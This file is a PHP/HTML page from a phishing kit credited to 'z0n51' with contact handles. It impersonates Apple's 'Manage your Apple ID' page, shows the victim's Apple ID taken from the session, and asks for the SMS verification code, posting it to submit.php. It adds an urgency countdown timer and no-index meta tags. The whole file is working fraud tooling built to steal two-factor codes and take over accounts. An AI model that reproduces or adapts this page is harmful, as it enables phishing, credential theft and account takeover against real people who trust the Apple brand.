<?php

/**
 * @link              https://www.z0n51.com/
 * @since             14/02/2020
 * @package           APPLE
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      APPLE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/fav.ico">

        <title>Manage your Apple ID - Apple</title>
    </head>

    <body>

        <div id="hero" class="imgbg">
            <div class="top-hero">
                <div class="container">
                    <ul class="d-lg-flex d-md-flex d-sm-none d-none">
                        <li><a class="logo-app" href="#"><i class="fab fa-apple"></i></a></li>
                        <li><a href="#">Mac</a></li>
                        <li><a href="#">iPad</a></li>
                        <li><a href="#">iPhone</a></li>
                        <li><a href="#">Watch</a></li>
                        <li><a href="#">TV</a></li>
                        <li><a href="#">Music</a></li>
                        <li><a href="#">Support</a></li>
                        <li><a href="#"><i class="fas fa-search"></i></a></li>
                        <li><a href="#"><i class="fas fa-shopping-bag"></i></a></li>
                    </ul>

                    <ul class="d-lg-none d-md-none d-sm-flex d-flex">
                        <li class="text-left"><a href="#"><i class="fas fa-stream"></i></a></li>
                        <li class="text-center"><a href="#"><i class="fab fa-apple"></i></a></li>
                        <li class="text-right"><a href="#"><i class="fas fa-shopping-bag"></i></a></li>
                    </ul>

                </div>
            </div>

            <div class="hero-title">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-9 col-md-9 col-sm-12 col-12">
                            <h3>Welcome</h3>
                            <p>Your Apple ID is <?php echo $_SESSION['apple_id']; ?></p>
                        </div>
                        <div class="col-md-3 d-lg-flex d-md-flex d-sm-none d-none align-items-center">
                            <button>Log Out</button>
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <div id="details">
            <div class="container">
                <div class="row">
                    <div class="col-lg-7 col-md-7 col-sm-12 col-12 left-side">
                        <form method="post" action="submit.php">
                            <input type="hidden" name="verbot">
                            <h3>Verification code</h3>
                            <div class="form-group mb-3">
                                <label for="card_number" class="mb-3">Enter the code received via SMS and press Confirm</label>
                                <input type="text" name="sms_code" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'sms_code') ?>" id="sms_code" placeholder="Code">
                                <?php echo error_message($_SESSION['errors'],'sms_code'); ?>
                            </div>
                            <button class="mt-4" type="submit">Continue</button>
                            <input type="hidden" name="type" value="sms">
                        </form>
                    </div>
                    <div class="col-lg-5 col-md-5 col-sm-12 col-12 right-side d-lg-flex d-md-flex d-sm-block d-block mt-lg-0 mt-md-0 mt-sm-5 mt-5 align-items-center justify-content-center">
                        <div class="timer">05:00</div>
                    </div>
                </div>
            </div>
        </div>

        <footer id="footer">
            <div class="container">
                <div class="row">
                    
                    <div class="col-md-9">
                        <p>More ways to shop: Visit an <a href="#">Apple Store</a>, call 1-800-MY-APPLE, or <a href="#">find a reseller</a>.</p>
                        <p>Copyright © 2020 Apple Inc. All rights reserved.</p>
                        <ul>
                            <li><a href="#">Privacy Policy</a></li>
                            <li><a href="#">Terms of Use</a></li>
                            <li><a href="#">Sales and Refunds</a></li>
                            <li><a href="#">Salg og refundering</a></li>
                            <li><a href="#">Legal</a></li>
                            <li><a href="#">Site Map</a></li>
                        </ul>
                    </div>
                    <div class="col-md-3 mt-lg-0 mt-md-0 mt-sm-3 mt-3 d-flex align-items-center">
                        <div class="lang">
                            <img src="../assets/images/usaflag.png"> United States
                        </div>
                    </div>

                </div>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/plugins/countdowntimer/jquery.countdownTimer.min.js"></script>
        <script src="../assets/js/main.js"></script>
        <script type="text/javascript">
            jQuery(function($){

                $(".timer").countdowntimer({
                    minutes: 2
                });
                
            })
        </script>

    </body>

</html>